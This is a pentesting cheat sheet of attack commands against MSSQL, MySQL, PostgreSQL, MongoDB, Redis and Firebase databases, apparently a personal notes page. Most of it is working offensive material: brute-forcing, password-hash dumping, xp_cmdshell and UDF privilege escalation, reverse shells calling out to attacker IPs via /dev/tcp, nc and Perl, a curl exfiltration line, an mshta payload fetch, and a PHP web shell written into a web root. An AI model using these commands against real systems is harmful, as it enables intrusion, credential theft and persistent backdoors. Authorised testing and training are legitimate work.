---
layout: notes
permalink: /notes/tech/db/
title: Pentesting Databases
---

# Pentesting Databases

<!----------------------------------------------------------MSSQL---------------------------------------------------------------->

<details markdown="1">
<summary>MSSQL (1433)</summary>
<p></p>

## Enumeration
```bash
nmap --script ms-sql-info -p 1433 <target-ip>
nmap --script ms-sql-config -p 1433 <target-ip>
nmap --script ms-sql-empty-password,ms-sql-xp-cmdshell -p 1433 <target-ip>
nmap --script ms-sql-* -p 1433 <target-ip>

# MSDAT: https://github.com/quentinhardy/msdat
# all: Enumerate with all modules
python3 msdat.py all -s example.com
# -D, -U, -P: Use Windows authentication
python3 msdat.py all -s example.com -D domain -U username -P password
# xpdirectory: List directories in system
python3 msdat.py xpdirectory -s manager.htb -D manager -U operator -P operator -d master --list-files 'C:\'
# bulkopen: Read/download files
python3 msdat.py bulkopen -s example.com -D domain -U username -P password -d database --read-file 'C:\Users\Administrator\Desktop\example.txt'

# Metasploit
msfconsole
msf> use admin/mssql/mssql_enum
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump
```

## Bruteforce
```bash
# netexec
netexec mssql <target-ip> -u username -p passwords.txt

#hydra
hydra -L usernames.txt –p password <target-ip> mssql
hydra -l username –P passwords.txt <target-ip> mssql

# Password Spraying
netexec mssql example.com -u usernames.txt -p 'HelloWorld!' --no-bruteforce --continue-on-success
```

## Connect
```bash
# impacket
impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip>
impacket-mssqlclient -port 1433 DOMAIN/username:password@<target-ip> -windows-auth

# sqsh
sqsh -S <target-ip> -U username -P password
sqsh -S <target-ip> -U username -P password -D database
```

## Commands
```bash
# Get the version of MSSQL
SELECT @@version
# Get current username
SELECT user_name()
# Get all users
SELECT * FROM sys.database_principals
# Filter users's result
select name,
       create_date,
       modify_date,
       type_desc as type,
       authentication_type_desc as authentication_type,
       sid
from sys.database_principals
where type not in ('A', 'R')
order by name;
# Get databases
SELECT * FROM master.dbo.sysdatabases
# Switch to the database
USE <database>
# List tables
SELECT * FROM information_schema.tables
# Get table content
SELECT * FROM <database_name>.dbo.<table_name>
# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
# Check if the current user have permission to execute OS command
USE master
EXEC sp_helprotect 'xp_cmdshell'
# Get linked servers
EXEC sp_linkedservers
SELECT * FROM sys.servers
# Create a new user with sysadmin privilege
CREATE LOGIN tester WITH PASSWORD = 'password'
EXEC sp_addsrvrolemember 'tester', 'sysadmin'
# List directories
xp_dirtree '.\'
xp_dirtree 'C:\inetpub\'
xp_dirtree 'C:\inetpub\wwwroot\'
xp_dirtree 'C:\Users\'
# Get hashed passwords
SELECT * FROM master.sys.syslogins;
```

## Privilege Escalation
```bash
# ---------Impersonation---------
# Assume that the 'sa' user can be impersonated.
EXECUTE AS 'sa'
EXEC xp_cmdshell 'whoami'

# ---------XP_CMDSHELL---------
# Enable/Disable Windows Shell
> enable_xp_cmdshell
> disable_xp_cmdshell
# or
# Enable advanced options
> EXEC sp_configure 'show advanced options', 1;
# Update the currently configured value for the advanced options
> RECONFIGURE;
# Enable the command shell
> EXEC sp_configure 'xp_cmdshell', 1;
# Update the currently configured value for the command shell
> RECONFIGURE;
# Execute commands
> xp_cmdshell whoami
# Execute obfuscated commands.
> xp_cmdshell 'powershell -e <BASE64_PAYLOAD>'

# ---------Metasploit---------
use exploit/windows/mssql/mssql_linkcrawler
#If the user has IMPERSONATION privilege, this will try to escalate
use admin/mssql/mssql_escalate_execute_as
#Escalate from db_owner to sysadmin
use admin/mssql/mssql_escalate_dbowner
#Code execution
#Execute commands
use admin/mssql/mssql_exec 
#Uploads and execute a payload
use exploit/windows/mssql/mssql_payload 
#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass

# ---------PowerShell scripts---------
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```

## Dump NTLM Hash
```bash
# 1. Start SMB Server and Responder
# In terminal 1
sudo responder -I <interface>
# In terminal 2
sudo impacket-smbserver share ./ -smb2support

# 2. Execute with Metasploit
# In terminal 3
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
set rhosts <target_ip>
set username <username>
set password <password>
# If we use Windows credential, set as below:
set use_windows_authent true
set smbproxy <responder_ip>
run
```

## Tools
```bash
# ---------MSSqlPwner https://github.com/ScorpionesLabs/MSSqlPwner ---------
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
# Executing custom assembly on the current server with windows authentication and executing hostname command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
# Executing the hostname command using stored procedures on the linked SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250

# ---------Impacket-mssqlclient---------
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go

# ---------crackmapexec---------
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'
```

</details>

<!----------------------------------------------------------MYSQL---------------------------------------------------------------->

<details markdown="1">
<summary>MySQL (3306)</summary>
<p></p>

## Enumeration
```bash
# Nmap
nmap --script mysql-info -p 3306 <target-ip>
nmap --script mysql-enum -p 3306 <target-ip>
nmap --script mysql-brute -p 3306 <target-ip>
nmap --script mysql-databases -p 3306 <target-ip>
nmap --script mysql-users -p 3306 <target-ip>
nmap --script mysql-* -p 3306 <target-ip>

# Metasploit
use auxiliary/scanner/mysql/mysql_version
use auxiliary/scanner/mysql/mysql_authbypass_hashdump
use auxiliary/scanner/mysql/mysql_hashdump #Creds
use auxiliary/admin/mysql/mysql_enum #Creds
use auxiliary/scanner/mysql/mysql_schemadump #Creds
use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Creds
```

## Bruteforce
```bash
hydra -l username -P passwords.txt <target-ip> mysql
hydra -L usernames.txt -p password <target-ip> mysql
```

## Config files
```bash
# Windows
config.ini
windows\my.ini
winnt\my.ini
<InstDir>/mysql/data/

# unix
cat /etc/mysql/my.cnf
cat /etc/mysql/mysql.conf.d/mysqld.cnf
cat /etc/mysql/debian.cnf
cat /etc/my.cnf
cat /var/lib/mysql/my.cnf
cat ~/.my.cnf

#Command History
~/.mysql.history

#Log Files
connections.log
update.log
common.log
```

## Commands
```bash
# ---------Connect Local---------
# No password
mysql -u username
# With Password
mysql -u username -p
# Specity database name
mysql -u username -p database_name

# ---------Connect Remote---------
mysql -u username -p -h <target-ip> -P 3306
# Without password (remove -p)
mysql -u username -h <target-ip> -P 3306
# Specify database (-D)
mysql -u username -p -h <target-ip> -D database_name
# Default credential (username: root, no password)
mysql -u root -h <target-ip> -P 3306

# ---------Basic commands---------
show databases;
# Display databases
show databases;
# Display tables in the current database
show tables;
# Display tables names
select * from tablename;
describe tablename;
# List mysql users
select user from mysql.user;
# List privileges of each user
select user,select_priv,insert_priv,update_priv,delete_priv,create_priv from mysql.user;
# Switch to the database
use db_name;
# Display tables and table type
show full tables;
# Display tables in the database
show tables from <database>;
# Display tables which names start with 'user'
show tables like 'user%';
# Display tables which names start with 'user' in the database
show tables from <database> like 'user%';
# Display columns in a given table
show columns from <table>;
# Display everything in the table
select * from <table>;
# Create new table
create table table_name(column_name column_type);
create table table_name(user_id int, user_name varchar(40));
# Create an user-defined function
create function func_name(param1, param2) returns datatype;
create function new_fund(age integer) returns integer;
# Use a function
select func_name(param1, param2);
# Insert new record to a given table
insert into <table> values(value1, value2);
# Update data in a given table
update <table> set <column>='<value>';
update <table> set <column1>='<value1>',<column2>='<value2>'; # e.g. update users set role='admin' where username='john';
# Delete a record
delete from <table> where <column> = <value>; # e.g. delete from users where id = 2;
```

## Read and Execute commands
```bash
# Read files
select load_file("/etc/passwd");

# Run system commands
select sys_eval("whoami");
select sys_eval("chmod u+s /bin/bash");
system whoami
system bash

# Execute command from source
source example.sql

# Load data local into a table
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```

## Command Injection -> Reverse Shell
```bash
# Update existing user email to execute reverse shell
update exampledb.users SET email='admin@shell|| bash -c "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1" &' where name like 'admin%';
```

## Privilege Escalation
```bash
# Check mysql running as root?
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | grep "user"
systemctl status mysql 2>/dev/null | grep -o ".\{0,0\}user.\{0,50\}" | cut -d '=' -f2 | cut -d ' ' -f1

# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh

# Extract hashes of the MySQL Users
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"

# ---------Linux PrivEsc---------
# Use a database
use mysql;
# Create a table to load the library and move it to the plugins dir
create table npn(line blob);
# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));
# Get the plugin_dir path
show variables like '%plugin%';
# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';
# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');


# ---------Windows PrivEsc---------
# CHech the linux comments for more indications
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

## Exctract hashes
```bash
select concat_ws(':', user_login, user_pass) from wp_users;
```

## Backdoor
```bash
#PHP Backdoor
SELECT "<?php echo system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wp-content/uploads/shell.php";
```

</details>


<!----------------------------------------------------------Postgres---------------------------------------------------------------->


<details markdown="1">
<summary>Postgresql (5432/5433)</summary>
<p></p>

## Enumeration
```bash
# nmap
nmap --script pgsql-brute -p 5432 <target-ip>

# metasploit
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```

## Bruteforce
```bash
# hydra
hydra -l username -P passwords.txt <target-ip> postgres
hydra -L usernames.txt -p password <target-ip> postgres

# Metasploit
msf> use auxiliary/scanner/postgres/postgres_login
msf> set rhosts <target-ip>
msf> run
```

## Connect
```bash
#Login
psql -h localhost -U dripmail_dba -d dripmail
<Password>
# -W: Force password prompt
psql -h <target-ip> -p <target-port> -d <database> -U <username> -W
# -w: No password
psql -h <target-ip> -p <target-port> -d <database> -U <username> -w
```

## Commands
```bash
# ---------------Basic Commands--------------
# Print help
\?
# Print the version of PostgreSQL
select version();
# Display command history
\s
# List databases
\l
# Switch to the given database
\c <database_name>
# List tables
\dt
# Descibe the table information
\d <table_name>
# Get values in the table
select * from <table>;
# List all users
\du
# Exit psql shell
\q

# ---------------Port Scanning---------------
SELECT * FROM dblink_connect('host=1.2.3.4
                              port=5678
                              user=name
                              password=secret
                              dbname=abc
                              connect_timeout=10');

# -------------Get users roles & groups-------------
# r.rolpassword
# r.rolconfig,
SELECT
      r.rolname,
      r.rolsuper,
      r.rolinherit,
      r.rolcreaterole,
      r.rolcreatedb,
      r.rolcanlogin,
      r.rolbypassrls,
      r.rolconnlimit,
      r.rolvaliduntil,
      r.oid,
  ARRAY(SELECT b.rolname
        FROM pg_catalog.pg_auth_members m
        JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
        WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.

# -----------------Tables-----------------
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';

# ----------------Functions----------------
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
    LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```

## Read Directories and Files
```bash
# ----------------Read file----------------
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;

# ---------Read file or list a directory---------
#Only superusers and users with explicit permissions can use them
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission
select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation

# ----------------File Writing----------------
# Only super users and members of pg_write_server_files can use copy to write files.
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
# if you aren't super user but has the CREATEROLE permissions you can make yourself member of that group:
GRANT pg_write_server_files TO username;
```

## Config files
```bash
# Version 14.x
/etc/postgresql/14/main/postgresql.conf
# Version 15.x
/etc/postgresql/15/main/postgresql.conf
# Also check env variables
env # Results
# PGUSER=xxxx
# PGPASSWORD=xxxx
# PGPASSFILE=xxxx
```

## Privelege Escalation
```bash
# if you have CREATEROLE permission you could grant yourself access to other roles (that aren't superuser) that can give you the option to read & write files and execute commands
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;

# Change password
ALTER USER user_name WITH PASSWORD 'new_password';

# It's pretty common to find that local users can login in PostgreSQL without providing any password. Therefore, once you have gathered permissions to execute code you can abuse these permissions to gran you SUPERUSER role
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';

# Local login from 127.0.0.1
# Check this function exists
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
# If yes try this
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
    port=5432
    user=someuser
    password=supersecret
    dbname=somedb',
    'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
# And try this
SELECT * FROM dblink('host=127.0.0.1
                          user=someuser
                          dbname=somedb',
                         'SELECT usename,passwd from pg_shadow')
                      RETURNS (result TEXT);

```


## Command Execution and Reverse Shell
```bash
# Reverse shell-1
COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.18 4444t >/tmp/f';

# Reverse shell-2
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

# Exfiltration
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -

# Using Metasploit
msf> use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
msf> set rhosts <target-ip>
msf> set lhost <local-ip>
msf> set tablename <table_name>
msf> set username <username>
msf> set password <password>
msf> run
shell

# CVE-2019-9193
nc -lvnp 4444
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
```

## Dump and Decrypt User Hashes from Database
```bash
# Dump user hash via Metasploit
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> set rhosts <target-ip>
msf> set username <username>
msf> set password <password>
msf> run

# Using gpg
# 1- if user hass privileges to access postgress backups
gpg --batch --yes --passphrase "2Qa2SsBkQvsc" --pinentry-mode loopback --decrypt /var/backups/postgres/dev-dripmail.old.sql.gpg > dev-dripmail.old.sql
# 2- Read the content
cat dev-dripmail.old.sql
# 3- Decrypt hash:
```

## Dump credentilas from pgadmin .db files
```bash
# pgadmin is an administration and development platform for PostgreSQL.
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
</details>

<!----------------------------------------------------------Firebase---------------------------------------------------------------->

<details markdown="1">
<summary>Firebase</summary>
<p></p>

## Tools
```bash
# https://github.com/Turr0n/firebase
python3 firebase.py -p 4 --dnsdumpster -l file

# https://github.com/MuhammadKhizerJaved/Insecure-Firebase-Exploit
Firebase_Exploit.py

# https://github.com/viperbluff/Firebase-Extractor
firebase.py xyz.firebaseio.com

# https://github.com/securebinary/firebaseExploiter
firebaseExploiter -u URL -exploit
```

</details>


<!----------------------------------------------------------MongoDB---------------------------------------------------------------->


<details markdown="1">
<summary>MongoDB (27017,27018)</summary>
<p></p>

## Enumeration
```bash
nmap --script mongodb-info -p 27017 <target-ip>
nmap --script mongodb-databases -p 27017 <target-ip>
```

## Bruteforce
```bash
hydra -l username -P passwords.txt <target-ip> mysql
hydra -L usernames.txt -p password <target-ip> mysql
```

## Connection
```bash
# Local
mongo
mongo --port 27017

# Remote
mongo --host <target-ip> --port 27017 -u username -p password
mongo "mongodb://<target-ip>:27017"
mongo "mongodb://username:password@<target-ip>:27017/?authSource=admin"
mongo --username "USER" --password --authenticationDatabase "DBNAME" --host "HOSTNAME" --port 27017
```

## Credentials/Config
```bash
/opt/bitnami/mongodb/mongodb.conf
grep "noauth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#" #Not needed
grep "auth.*true" /opt/bitnami/mongodb/mongodb.conf | grep -v "^#\|noauth" #Not needed
```

## Commands
```bash
# All databases
> show dbs
# Current database
> db
# Switch database if it exists, or create new if not exist
> use db_name
# Collections
> show collections
# Run javascript file
> load("example.js")

# List users in the current database
> show users
> db.admin.find()

# Create new collection in current database
> db.createCollection("users")
```

## CRUD
```bash
# Create
> db.<collection_name>.insert({id: "1", username: "admin"})
# Read
> db.<collection_name>.find()
> db.<collection_name>.findOne({"username":"michael"})
# Update
> db.<collection_name>.update({id: "1"}, {$set: {username: "king"}})
# Delete
> db.<collection_name>.remove({"name": "Micael"})
# Delete all documents
> db.<collection_name>.remove({})
```

## Operators
```bash
# $eq: equal
# ex. username is "admin"
db.<collection_name>.findOne({username: {"$eq": "admin"}})

# $ne: not equal
# ex. password is not "xyz"
db.<collection_name>.findOne({id: "1"}, {password: {"$ne": "xyz"}})

# $gt: greater than
# ex. id is greater than 2
db.<collection_name>.findOne({id: {"$gt": "2"}})

# $match: filter the documents to pass only the documents that match the specified conditions to the next pipeline stage.
{$match: { username: "admin" }}

# $lookup: join to a collection in the same database to filter in documents from the "joined" collection for processing.
{
    $lookup:
        {
            from: "users",
            localField: "_id",
            foreignField: "_id",
            as: "test"
        }
}
```
</details>


<!-- --------------------------------------------------------Redis-------------------------------------------------------------- -->


<details markdown="1">
<summary>Redis (6379)</summary>
<p></p>


### Enumeration
```bash
nmap --script redis-info -p 6379 <target-ip>
nmap --script redis-brute -p 6379 <target-ip>

#Metasploit
use auxiliary/scanner/redis/redis_server
msf auxiliary(scanner/redis/redis_server) > set rhosts 10.10.10.10
msf auxiliary(scanner/redis/redis_server) > exploit
```

### Config
```bash
find / -name "redis.conf" 2>/dev/null
grep -i pass /path/to/redis.conf
```

### Connect
```bash
#Connect via CLI
redis-cli -u redis://xxx.example.com
redis-cli -h <target-ip> -p 6379
# with password
redis-cli -h <target-ip> -p 6379 -a password
redis-cli -h <hostname> -p <port> --user <username> -a <password>
redis://:<password>@<hostname>:<port>
# using socket
redis-cli -s /path/to/redis.sock
```

### Commands
```bash
# Check credentials
> auth <username> <password>
> auth default <password>

# Set a password temporary until the service restarts.
> config set requirepass <password>

# Information on the Redis server
> info
> info keyspace

# List all
> config get *

# List all databases
> config get databases

# Select the database ('select <index>')
> select 0
> select 1
> select 12

# Read files and directories using Lua scripts
> eval "dofile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\user.txt')" 0
> eval "dofile('C:\\\\Users\\\\<username>\\\\Desktop\\\\user.txt')" 0

# Find all keys
> keys *

# Get the type of value
> type <key_name>

# Get all fields and values of the hash stored at key.
> hgetall <key>
# e.g.
> hgetall admin

# Get a string value
> get <key> <field>
# e.g.
> get admin email

# Get a hashed value
> hget <key> <field>
# e.g.
> hget admin password

# Get multiple hashed values associated with specified fields
> hmget <key> <field1> <field2>
# e.g.
> hmget admin email password

# type: lists
> lrange <key_name> <start> <stop>
# e.g.
> lrange "userlist" 0 0
> lrange "userlist" 0 5

# type: sets
> smembers <key_name>

# type: sorted sets
> zrangebyscore <key_name> <min> <max>

# type: stream
> xread count <count> streams <key_name> <id>

# Set a hashed value in a field
> set <key> <field> <value>
# e.g.
> set admin email admin@example.com

# Set a hashed value in a field
> hset <key> <field> <value>
# e.g.
> hset admin password 286755fad04869ca523320acce0dc6a4

> lpush <key> <element>
> lpush <key> <element> <element>
> lpush <key> <element> <element> <element>
# e.g.
> lpush myword "abracadabra"

#RESP Format
telnet 10.0.0.1 6379
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
*3
$3
set
$4
name
$4
john
```

### Nginx missconfig
```bash
# HSET <key> <field> <value>
curl -X "HSET" https://example.com/unix:/path/to/redis.sock:<key>%20<field>%20<value>%20/abc
```

### NTLM Hash Disclosure
```bash
mkdir share
sudo impacket-smbserver share ./share/ -smb2support
> eval "dofile('//10.0.0.1/share')" 0
```
</details>


<!----------------------------------------------------------NoSQL---------------------------------------------------------------->


<details markdown="1">
<summary>NoSQL (Resources)</summary>
<p></p>

## Online Resources

- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/nosql-injection)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [MongoDB Payloads](https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt)
- [MongoDB Pentest](http://securitysynapse.blogspot.com/2015/07/intro-to-hacking-mongo-db.html)
- [Injection CheatSheet 1](https://nullsweep.com/nosql-injection-cheatsheet/)
- [Injection CheatSheet 2](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)
- [Injection CheatSheet 3](https://www.infoq.com/articles/nosql-injections-analysis/)
- [Injection CheatSheet 4](https://rdsec.net/securec0ding/2019/NoSQL_Injection.html)
- [Injection CheatSheet 5](https://www.stjoern.com/menu-db/nosql)
- [Injection CheatSheet 6](https://securityintelligence.com/does-nosql-equal-no-injection/)
- [Blog part1](https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html)
- [Blog part2](https://blog.websecurify.com/2014/08/attacks-nodejs-and-mongodb-part-to.html)

</details>